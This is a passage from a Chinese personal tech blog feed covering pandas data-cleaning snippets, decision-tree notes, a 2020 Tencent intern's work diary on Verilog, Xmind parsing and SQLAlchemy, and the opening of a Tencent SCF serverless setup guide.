class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># 计算缺失值</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># 每列有多少缺失值</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># 查看缺失值</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用整列的均值进行填充</span></span><br><span class="line">df[<span class="string">&#x27;评价人数&#x27;</span>] = df[<span class="string">&#x27;评价人数&#x27;</span>].fillna(df[<span class="string">&#x27;评价人数&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># 现在将评分列的缺失值，替换为上一个电影的评分</span></span><br><span class="line">df[<span class="string">&#x27;评分&#x27;</span>] = df[<span class="string">&#x27;评分&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用上下数字的均值进行填充</span></span><br><span class="line">df[<span class="string">&#x27;评价人数&#x27;</span>] = df[<span class="string">&#x27;评价人数&#x27;</span>].fillna(df[<span class="string">&#x27;评价人数&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># 在填充 “语言” 列的缺失值，要求根据 “国家/地区” 列的值进行填充</span></span><br><span class="line">df[<span class="string">&#x27;语言&#x27;</span>]=df.groupby(<span class="string">&#x27;国家/地区&#x27;</span>).语言.bfill()</span><br><span class="line"><span class="comment"># 查找重复值</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># 查找指定列的重复值</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;片名&#x27;</span>])]</span><br><span class="line"><span class="comment"># 删除全部的重复值</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># 删除全部的重复值，但保留最后一次出现的值first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算各省市出现的次数</span></span><br><span class="line">df.省市.value_counts()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 都可以用inplace=True来代替赋值</span></span><br></pre></td></tr></table></figure><h3><span id="删除空行">删除空行</span></h3><p><strong>1.函数详解</strong></p><p>函数形式：dropna(axis&#x3D;0, how&#x3D;’any’, thresh&#x3D;None, subset&#x3D;None, inplace&#x3D;False)</p><p>参数：</p><p><strong>axis</strong>：轴。0或’index’，表示按行删除；1或’columns’，表示按列删除。</p><p><strong>how</strong>：筛选方式。‘any’，表示该行&#x2F;列只要有一个以上的空值，就删除该行&#x2F;列；‘all’，表示该行&#x2F;列全部都为空值，就删除该行&#x2F;列。</p><p><strong>thresh</strong>：非空元素最低数量。int型，默认为None。如果该行&#x2F;列中，非空元素数量小于这个值，就删除该行&#x2F;列。</p><p><strong>subset</strong>：子集。列表，元素为行或者列的索引。如果axis&#x3D;0或者‘index’，subset中元素为列的索引；如果axis&#x3D;1或者‘column’，subset中元素为行的索引。由subset限制的子区域，是判断是否删除该行&#x2F;列的条件判断区域。</p><p><strong>inplace</strong>：是否原地替换。布尔值，默认为False。如果为True，则在原DataFrame上进行操作，返回值为None。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除整行缺失的数据，剩余缺失数据按0值进行填充</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 删除某列为空的行</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;客户ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="替换">替换</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将金牌数列的数字 0 替换为 无</span></span><br><span class="line">df[<span class="string">&#x27;金牌数&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;无&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#同时替换 1将 无 替换为 缺失值 2将 0 替换为 None</span></span><br><span class="line">df.replace([<span class="string">&#x27;无&#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 将 `金牌数` 列类型修改为 `int`</span></span><br><span class="line">df[<span class="string">&#x27;金牌数&#x27;</span>] = df[<span class="string">&#x27;金牌数&#x27;</span>].fillna(<span class="string">&#x27;0&#x27;</span>).astype(<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure><h2><span id="算法总结">算法总结</span></h2><table><thead><tr><th>分类</th><th>回归</th></tr></thead><tbody><tr><td>分类树<strong>tree.DecisionTreeClassififier</strong></td><td>回归树<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>随机森林<strong>ensemble.RandomForestClassifier</strong></td><td>回归森林<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>逻辑回归<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>梯度提升树木<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3><span id="决策树">决策树</span></h3><p><strong>决策树优点</strong></p><ol><li><p>易于理解和解释，因为树木可以画出来被看见</p></li><li><p>需要很少的数据准备。其他很多算法通常都需要数据规范化，需要创建虚拟变量并删除空值等。但请注意，sklearn中的决策树模块不支持对缺失值的处理。</p></li><li><p>使用树的成本（比如说，在预测数据的时候）是用于训练树的数据点的数量的对数，相比于其他算法，这是一个很低的成本。</p></li><li><p>能够同时处理数字和分类数据，既可以做回归又可以做分类。其他技术通常专门用于分析仅具有一种变量类型的数据集。</p></li><li><p>能够处理多输出问题，即含有多个标签的问题，注意与一个标签中含有多种标签分类的问题区别开</p></li><li><p>是一个白盒模型，结果很容易能够被解释。如果在模型中可以观察到给定的情况，则可以通过布尔逻辑轻松解释条件。相反，在黑盒模型中（例如，在人工神经网络中），结果可能更难以解释。</p></li><li><p>可以使用统计测试验证模型，这让我们可以考虑模型的可靠性。</p></li><li><p>即使其假设在某种程度上违反了生成数据的真实模型，也能够表现良好。</p></li></ol><p><strong>决策树的缺点</strong></p><ol><li><p>决策树学习者可能创建过于复杂的树，这些树不能很好地推广数据。这称为过度拟合。修剪，设置叶节点所需的最小样本数或设置树的最大深度等机制是避免此问题所必需的，而这些参数的整合和调整对初学者来说会比较晦涩</p></li><li><p>决策树可能不稳定，数据中微小的变化可能导致生成完全不同的树，这个问题需要通过集成算法来解决。</p></li><li><p>决策树的学习是基于贪婪算法，它靠优化局部最优（每个节点的最优）来试图达到整体的最优，但这种做法不能保证返回全局最优决策树。这个问题也可以由集成算法来解决，在随机森林中，特征和样本会在分枝过程中被随机采样。</p></li><li><p>有些概念很难学习，因为决策树不容易表达它们，例如XOR，奇偶校验或多路复用器问题。</p></li><li><p>如果标签中的某些类占主导地位，决策树学习者会创建偏向主导类的树。因此，建议在拟合决策树之前平衡数据集。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="机器学习" scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="机器学习 大数据 pandas" scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/"/>
    
  </entry>
  
  <entry>
    <title>鹅场的日记</title>
    <link href="https://disda-coding.github.io/2020/05/28/Tencent-intern-LOG/"/>
    <id>https://disda-coding.github.io/2020/05/28/Tencent-intern-LOG/</id>
    <published>2020-05-28T15:14:13.000Z</published>
    <updated>2023-03-31T08:13:14.291Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>笔者之前使用的Java居多，进入腾讯实习得转C++，因此相对C++工程师来说基础为0。想通过日记的方式记录自己的成长和生活的一些琐事，争取转正。</p><span id="more"></span><!-- toc --><ul><li><a href="#2020520">2020&#x2F;5&#x2F;20</a></li><li><a href="#2020521">2020&#x2F;5&#x2F;21</a></li><li><a href="#2020522">2020&#x2F;5&#x2F;22</a></li><li><a href="#2020525">2020&#x2F;5&#x2F;25</a></li><li><a href="#2020526">2020&#x2F;5&#x2F;26</a></li><li><a href="#examples">Examples</a></li><li><a href="#2020527">2020&#x2F;5&#x2F;27</a></li><li><a href="#2020528">2020&#x2F;5&#x2F;28</a></li><li><a href="#2020529">2020&#x2F;5&#x2F;29</a></li><li><a href="#202061">2020&#x2F;6&#x2F;1</a></li><li><a href="#202062">2020&#x2F;6&#x2F;2</a></li><li><a href="#202063">2020&#x2F;6&#x2F;3</a></li><li><a href="#202064">2020&#x2F;6&#x2F;4</a></li><li><a href="#202065">2020&#x2F;6&#x2F;5</a></li><li><a href="#202068">2020&#x2F;6&#x2F;8</a></li><li><a href="#202069">2020&#x2F;6&#x2F;9</a></li><li><a href="#2020610">2020&#x2F;6&#x2F;10</a></li><li><a href="#2020611">2020&#x2F;6&#x2F;11</a></li></ul><!-- tocstop --><h2><span id="2020x2f5x2f20">2020&#x2F;5&#x2F;20</span></h2><p>​刚到深圳就下雨了，路上很多黑车司机漫天要价到酒店要90、100。我看了一眼滴滴才需要50.果断选择打滴滴，但是后面一个黑车老板锲而不舍报了个60，然后我感觉差不多就答应了，没想到一上车就下雨了，也是运气很好。虽然路上还捎了两个人但是先送我到酒店，不过黑车也没送到酒店门口。到酒店后走完流程，完成线上的签约就静等腾讯那边流程，晚些时候打了一会无限火力。</p><h2><span id="2020x2f5x2f21">2020&#x2F;5&#x2F;21</span></h2><p>​hr助手上显示通行码明天才会绿，今天去不了公司了。果断去B站把小程序剩下的内容学习完。</p><h2><span id="2020x2f5x2f22">2020&#x2F;5&#x2F;22</span></h2><p>​今天起了个大早，昨天晚上看地图显示到公司差不多30分钟，然后提早起来，吃完饭就去等公交了，没想到路上那个堵啊，1小时才走完4公里的路。心态发生了点变化，好在下车点离腾讯大厦很近。领完了临时工牌上楼拿到了正式员工的工牌，然后在29楼等到了亲爱的导师Songa后，导师给我安排了工位，由于人比较多给我安排的是个临时的工位。不过腾讯的椅子坐起来还是比较nice的。</p><p><img src="/2020/05/28/Tencent-intern-LOG/2e51e8d8f26e43a3f79bf461582f347.jpg" alt="工位电脑"></p><p>​早上主要是熟悉一下公司环境还有将公司配的电脑进行标准化设置。电脑配置还蛮不错的i7 9700+32G+1TSSD，公司网也是极快的，我就装上了chrome开始使用Google，感觉真的完爆了百度。后面导师让我研究一下Xilinx U20的卡（FPGA架构），以及智能的网卡DPDK。</p><p>​很快就到中午了，导师也是很nice的和我吃了一下午饭，然后带我溜达了一圈，还去了28楼领取了腾讯发的口罩，还是比亚迪生产的。</p><p><img src="/2020/05/28/Tencent-intern-LOG/0aa79f15a16da0334e10cfedf1c85b5.jpg" alt="口罩"></p><p>​吃完饭就可以休息了，一般大家从11:30就可以准备去吃饭了，然后中午可以休息到2点，主要我也比较难以入睡，一天靠两杯拿铁度过了。后面Leader也是带我去见了一面总监，然后给我介绍了一下组里面的情况，以及30TB&#x2F;s流量的监控平台——天幕，监控了腾讯百分之98的流量，可谓是十分强大了。后面和导师交流了一下我的培养计划，发现小程序那部分内容其实有团队做完了。看来我必须直面我最薄弱的点。我本来是做Java偏上层应用的，没想到要转C++来开发底层的硬件了。而且全组唯一有FPGA经验的大佬还被当作救兵去救急了。 哈哈哈，如果转型成功那就相当于凤凰涅槃了，既是机遇也是挑战。</p><p>​因此我第一天其实感受到压力还是蛮大的，然后第一天就收到了下午茶的福利，导师给了我一份水果捞一份甘露，看来鹅场福利还是名不虚传的。除此之外还有披萨和鸡块哈哈哈。文具、纸巾啥的也是随便拿，总的来说腾讯提供了一个特别Nice的工作环境和工作氛围，如果适应了其实感觉不到累。</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100708719.png" alt="下午茶"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100747548.png" alt="福利"></p><p>​虽然做的东西我都没有任何的经验，我还是相信自己的攻坚能力的，好好加油争取能先入个门，等入门了就会轻松一点了。</p><p>​后面是打算工作到8点后然后在公司里面健身，然后打车回家咯，今天和好基友出去恰了个饭然后就回来了。</p><p>​要说一点企业微信还是比钉钉人性化，虽然说钉钉是为企业服务完全不需要考虑你员工的体验，但是我还是比较喜欢腾讯的企业微信的，多了一些人性的关怀吧。</p><p>​腾讯的瑞雪文化我也特别的喜欢，相比百度其实我心中的Dream Company就是腾讯了。希望自己能尽快的融入团队吧。</p><h2><span id="2020x2f5x2f25">2020&#x2F;5&#x2F;25</span></h2><ul><li><p>早上去滨海大厦送合同，顺便参观了一下大楼。</p></li><li><p>调研FPGA的数字电路设计语言（分别有Verilog HDL和VHDL，国内和欧美使用Verilog比较多，欧洲使用VHDL比较多。通常在小型中型设计的时候使用Verilog，因为其特性比较灵活。在大型的设计中使用VHDL比较多，因为其以严谨性著称。）</p></li><li><p>使用搜索引擎搜索相关教程,开始学习Verilog HDL语言。</p><blockquote><p>​学习了什么是Verilog HDL</p><p>​学习了模块、时延和设计的表述方式</p><p>​学习了标识符、注释、格式、编译命令和系统任务与函数</p></blockquote></li><li><p>了解Xmind后台项目</p></li><li><p>研究了Xmind的python包，但是存在着无法和最新版xmind软件兼容的问题。</p></li><li><p>晚上实地探勘了班车，并体验了腾讯班车。</p></li></ul><h2><span id="2020x2f5x2f26">2020&#x2F;5&#x2F;26</span></h2><ul><li><p>学习Verilog HDL语言</p><blockquote><p>学习了值集合、数据类型、表达式、门电平模型化。</p></blockquote><p>记录一下Verilog语言中的 reg[MSB:LSB] a，其中a寄存器的位数为MSB-LSB+1，且其中的a是无符号整数，引用官网文档：</p><p>Vectors can be declared for all types of <strong>net</strong> data types and for <strong>reg</strong> data types. Specifying vectors for <strong>integer</strong>, <strong>real</strong>, <strong>realtime</strong>, and <strong>time</strong> data types is illegal.</p><h2><span id="examples">Examples</span></h2><p>Example 1</p><p><strong>reg</strong> [3:0] addr;</p><p>The ‘addr’ variable is a 4-bit vector register made up of addr[3] (the most significant bit), addr[2], addr[1], and addr[0] (the least significant bit).</p><p>Example 2</p><p><strong>wire</strong> [-3:4] d;</p><p>The d variable is 8-bit vector net made up of d[-3] (msb), d[-2], d[-1], d[0], d[1], d[2], d[3], d[4] (lsb).</p><p>Example 3</p><p><strong>tri</strong> [5:0] x, y, z;</p><p>The above line declares three 6-bit vectors.   </p><p>记录一下assign的意义，有时候用assign有时候直接赋值：</p><blockquote><p>The <strong>assign</strong> construct in Verilog is the <strong>continuous</strong> assignment statement in Verilog which is used in <strong>dataflow</strong> modelling.</p></blockquote></li><li><p>公司的网好像用pip和npm下载一些包以及安装一些软件都装不上。</p></li><li><p>下午开始认真看Xmind项目的需求，一开始没什么头绪，晚上写完代码测试了一下层次遍历和前序遍历，决定使用层次遍历的方法。</p></li><li><p>晚上想到方法后一直睡不着，记录了一下所思考的思路。</p></li></ul><h2><span id="2020x2f5x2f27">2020&#x2F;5&#x2F;27</span></h2><ul><li><p>早上还是早早的起来搭乘班车到公司</p></li><li><p>一边谷歌一边coding把我的想法实现了，应该是问题不大。</p></li><li><p>下午，构思了一下复杂模板的设计和规范，最终实现了一个demo</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213647495.png" alt="简化版xmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213710782.png" alt="处理完的结果"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213736644.png" alt="复杂版本xmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213757782.png" alt="处理后的结果"></p></li><li><p>继续学习Verilog</p><blockquote><p> 组合电路与时序电路</p></blockquote></li><li><p>晚上和中心的人打篮球，打完后一身汗不方便坐大巴索性骑车回酒店</p></li><li><p>感觉这样的生活还是蛮舒服的，虽然说大城市给予自己的时间变少了，但是公司的氛围都特别融洽，慢慢感受到了瑞雪文化。越发的想留在腾讯了，我也是越来越好，越来越自信了。</p></li></ul><h2><span id="2020x2f5x2f28">2020&#x2F;5&#x2F;28</span></h2><ul><li><p>按照需求修改Xmind</p><blockquote><p>修改了代码实现标签追加功能</p><p>增加了默认权限为0的操作</p><p>修改代码实现了按顺序添加属性功能</p><p>实现了区分用例标题和属性</p></blockquote><p>但是很遗憾的是xmind包不支持xmind zen版本</p><p>因此我决定改变一个思路，去找有没有将zen转为json的包，并且对json进行层次遍历，这样虽然效率低了但是也能实现功能，代码也可以复用。</p></li><li><p>继续学习Verilog</p><blockquote><p>数据流模型化</p></blockquote></li><li><p>项目经理让我帮黄博对接一下AI LAB</p></li><li><p>晚上健身+骑车回酒店</p></li></ul><h2><span id="2020x2f5x2f29">2020&#x2F;5&#x2F;29</span></h2><ul><li>继续研究如何解析Xmind</li><li>放弃了自己写的解析代码，查询了相关文档使用了json库自带的功能。</li><li>完成了对JSON的解析，并且将结果封装成对象。</li><li>默认一个ZEN文档一个画布</li><li>为了代码可读性、维护性和开发的便捷性，牺牲一丢丢性能，将解析Xmind单独写成一个文件。</li><li>完成对JSON文件的解析生成模型节点，并且对模型节点解析，结合我之前的解析代码把整个Xmind文件按格式解析出来。</li></ul><h2><span id="2020x2f6x2f1">2020&#x2F;6&#x2F;1</span></h2><ul><li><p>继续学习Verilog</p><blockquote><p> 学习了行为建模 结构建模</p></blockquote></li><li><p>Xmind 解析项目</p><blockquote><p>优化Xmind解析算法，添加注释，加入多画布支持。</p><p>删除冗余代码，减少空间复杂度。</p><p>开会讨论下一步计划：</p></blockquote><blockquote><pre><code>    1.  解析目录    2.  转换成其他对象    3.  容错和校验</code></pre></blockquote></li><li><p>完成解析目录和结果集转化为NodeDOList对象，元素转化为NodeDO对象。</p></li></ul><h2><span id="2020x2f6x2f2">2020&#x2F;6&#x2F;2</span></h2><ul><li><p>Xmind解析：</p><blockquote><p>修复了多次设置属性的bug</p><p>添加了对优先级的判错：</p><p>​如果是p后数字大于3小于0就报错</p><p>​如果是标签没加#则判错，如果在优先级后写标签没加|则报错</p><p>容错：</p><p>​如果是小写p开头就转化成大写P</p><p>优化了代码，使用一个父类提取节点基本属性同时两个子类title_node和example_node继承父类Node</p><p>基本完成对Xmind解析的开发</p></blockquote></li><li><p>阅读Django服务器的代码，为开发后台功能做准备。</p><ul><li><p>upload_file</p><blockquote><p>流程：</p><p>​读取到上传的文件</p><p>​生成uuid并把“-”去除</p><p>​缓存到本地</p><p>​上传到服务器</p><p>​ 将信息返回前端</p></blockquote></li><li><p>parse_task_status</p><blockquote><p> 获取 获取提交的解析任务 和 获取提交的用例处理任务的状态 返回前端</p></blockquote></li></ul></li><li><p>提前请假从酒店搬到租房那里了，今天刚好状态不行，早点回去了。租房还可以，坐个地铁就到公司了，终于不需要那么早起了 哈哈哈。租房条件中规中矩吧。</p></li></ul><h2><span id="2020x2f6x2f3">2020&#x2F;6&#x2F;3</span></h2><ul><li><p>继续阅读Django后台源码</p><ul><li><p>parse_usecase_list</p><blockquote><p>解析用例列表包含：</p><p>​获取包含用例的个数？</p><p>​获取传入参数所对应的用例信息</p><p>返回</p></blockquote></li><li><p>update_usecase_content</p><blockquote><p> 更新 用例内容</p><p> 判断用例是否为自动化样例 是的话就需要去做一些合法性判断</p></blockquote></li><li><p>data_import</p><blockquote><p>判断是否曾经写过数据 写过就返回，没写过就创建对象然后异步写DB</p></blockquote></li><li><p>data_import_status</p><blockquote><p>返回上传文件后的结果</p></blockquote></li><li><p>import_task_history</p><blockquote><p>获取当前登录人提交的导入任务列表</p></blockquote></li><li><p>auto_fileupload</p><blockquote><p>逻辑和auto_fileupload差不多 处理一些字段不大一样</p></blockquote></li><li><p>auto_extra_params</p><blockquote><p>获取关联的智研项目信息 并且 更新任务状态和信息</p></blockquote></li><li><p>auto_task_history</p><blockquote><p>获取git自动操作的任务记录列表</p></blockquote></li><li><p>auto_task_history_details</p><blockquote><p>获取git自动操作,指定任务的用例记录详情列表</p></blockquote></li></ul></li><li><p>开会，商量天幕后台数据解析和可视化功能。</p></li></ul><h2><span id="2020x2f6x2f4">2020&#x2F;6&#x2F;4</span></h2><ul><li><p>了解了一下python连接数据库的各种包以及相关的ORM包。</p></li><li><p>开会了解了一下逻辑和需求。</p></li><li><p>查看数据库并且分析哪些数据段缺失，哪些数据段需要。</p></li></ul><h2><span id="2020x2f6x2f5">2020&#x2F;6&#x2F;5</span></h2><ul><li><p>继续分析需求和研究数据库</p></li><li><p>查找缺失的字段。</p></li><li><p>解决了sqlachemy连接数据库的问题（enum字段）</p></li></ul><h2><span id="2020x2f6x2f8">2020&#x2F;6&#x2F;8</span></h2><ul><li><p>和waine最后确定需求：</p></li><li><p>通过Excel确定了无法获取的数据，并且反馈给同事。</p></li><li><p>继续研究sqlAchemy，实现了：</p><blockquote><p>对BIGINT的支持</p><p>对表存在与否判断</p><p>创建部分数据库</p><p>完成对园区，交换机，服务器表的建立。</p><p>完成了yaml配置文件的书写</p></blockquote></li></ul><h2><span id="2020x2f6x2f9">2020&#x2F;6&#x2F;9</span></h2><ul><li><p>解决了python一个奇怪的bug（创建对象的时候还是得加（））</p></li><li><p>开发需求</p><blockquote><p>完成了将已知数据录入IDC状态表的功能</p><p>完成了将已知数据录入Server状态表的功能</p><p>完成了将已知数据录入switch状态表的功能</p></blockquote></li><li><p>树立流程：</p><blockquote><ol><li><p>对数据表进行分析，并抽取有用的数据项</p></li><li><p>对有用的数据表建立domain object实现对象和数据库之间的映射</p></li><li><p>书写业务逻辑，将表数据有机结合在一起</p></li><li><p>书写测试样例，测试业务逻辑的正确性。</p></li><li><p>对代码进行单机测试</p></li><li><p>核对需求，看看是否能满足标准</p></li><li><p>对代码Review，优化代码（ORM部分优化？）</p></li><li><p>将代码部署到服务器上，进行测试</p></li><li><p>项目迭代</p></li></ol></blockquote></li></ul><h2><span id="2020x2f6x2f10">2020&#x2F;6&#x2F;10</span></h2><ul><li><p>抽取代码 解耦</p><blockquote><p>使用default.yaml作为配置文件</p><p>代码分层：</p><p>​DO层 ： 存放ORM对象</p><p>​DAO层： 用于对数据库以及配置文件处理</p><p>​Service层：实现业务逻辑</p></blockquote></li><li><p>根据需求重写逻辑</p><blockquote><p>由于代码结构的合理性，修改变得简单。</p></blockquote></li><li><p>阅读新数据库，分析抽取有用的部分，并且创建对应的ORM DO</p><blockquote><p>如何针对每天来插入数据？日期的对比？</p><p>研究python中的日期</p><p>表名根据日期变换带来的数据库表访问问题？</p></blockquote></li><li><p>建立ORM对象小技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` [a-zA-Z]*.*</span><br></pre></td></tr></table></figure></li></ul><h2><span id="2020x2f6x2f11">2020&#x2F;6&#x2F;11</span></h2><ul><li><p>动态改变表名</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">OptServerInfoGetter</span>(<span class="params">suffix, Base_class=Base</span>):</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">OptServerRelationInfo</span>(<span class="title class_ inherited__">Base_class</span>):</span><br><span class="line">     __tablename__ = <span class="string">&#x27;opt_info_&#x27;</span> + suffix</span><br><span class="line">     manageip = Column(String(<span class="number">16</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     interface = Column(String(<span class="number">64</span>))</span><br><span class="line">     description = Column(String(<span class="number">128</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     status = Column(String)</span><br><span class="line">     bandwidth = Column()</span><br><span class="line">     unitType = Column()</span><br><span class="line">     rateCount = Column()</span><br><span class="line">     ratePkgCount = Column()</span><br><span class="line">     outputunitType = Column()</span><br><span class="line">     outputrateCount = Column()</span><br><span class="line">     outputratePkgCount = Column()</span><br><span class="line">     orderlist = Column()</span><br><span class="line"> <span class="keyword">return</span> OptServerRelationInfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OptServerRelationInfo = OptServerInfoGetter(<span class="string">&#x27;20200609&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>继续优化代码</p><blockquote><p>​DO： 存放ORM对象</p><p>​DAO： 用于对数据库以及配置文件处理</p><p>​Service：实现业务逻辑</p><p>​Utils：实现其余工具功能</p></blockquote></li><li><p>需要讲一下卫星的项目：</p></li><li><p>讨论了一下数据的来源问题</p><blockquote><p>进制换算1k 然后峰值计算需要sum来做</p></blockquote></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;笔者之前使用的Java居多，进入腾讯实习得转C++，因此相对C++工程师来说基础为0。想通过日记的方式记录自己的成长和生活的一些琐事，争取转正。&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="实习日记" scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Tencent-SCF</title>
    <link href="https://disda-coding.github.io/2020/05/07/SCF/"/>
    <id>https://disda-coding.github.io/2020/05/07/SCF/</id>
    <published>2020-05-07T04:50:50.000Z</published>
    <updated>2023-03-31T02:21:27.199Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下使用serverless SCF中实践的过程遇到的一些坑。</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">配置环境</a><ul><li><a href="#%E8%AE%BE%E7%BD%AEapi%E5%AF%86%E9%92%A5">设置API密钥</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%A7%92%E8%89%B2">设置角色</a></li></ul></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83">生产环境</a><ul><li><a href="#%E6%8E%A7%E5%88%B6%E5%8F%B0">控制台</a></li><li><a href="#cli">CLI</a></li><li><a href="#vscode%E6%8E%A8%E8%8D%90">VSCode（推荐）</a></li></ul></li><li><a href="#scf%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8">SCF进阶使用</a><ul><li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2">日志查询</a></li><li><a href="#scf%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%91%8A%E8%AD%A6">SCF监控与告警</a></li></ul></li><li><a href="#scf%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE">SCF触发器类型以及如何配置</a><ul><li><a href="#%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B">触发器类型</a></li><li><a href="#scf%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%85%8D%E7%BD%AE">SCF网络与配置</a><ul><li><a href="#%E9%85%8D%E7%BD%AEvpc">配置VPC</a></li></ul></li><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">配置环境变量</a></li><li><a href="#api-explorer">API Explorer</a></li></ul></li></ul><!-- tocstop --><h1><span id="配置环境">配置环境</span></h1><h2><span id="设置api密钥">设置API密钥</span></h2><p><img src="/2020/05/07/SCF/image-20200507125902880.png" alt="设置API密钥"></p><p>登录腾讯云，在云产品中去设置一个新的秘钥。</p><h2><span id="设置角色">设置角色</span></h2><p><img src="/2020/05/07/SCF/image-20200507130010962.png" alt="设置角色"></p><p>需要注意的是我们需要为scf去设置角色，防止上传的时候出现问题。</p><p><img src="/2020/05/07/SCF/image-20200507130137864.png"></p><p>选择一个策略名，然后重命名为SCF_QcsRole，这个是使用命令行工具的时候运行scf deploy的时候默认上传使用的名字。</p><h1><span id="生产环境">生产环境</span></h1><h2><span id="控制台">控制台</span></h2><p>直接打开我们web端的控制台去coding</p><h2><span id="cli">CLI</span></h2><ul><li>配置python环境和pip。</li></ul><p><a 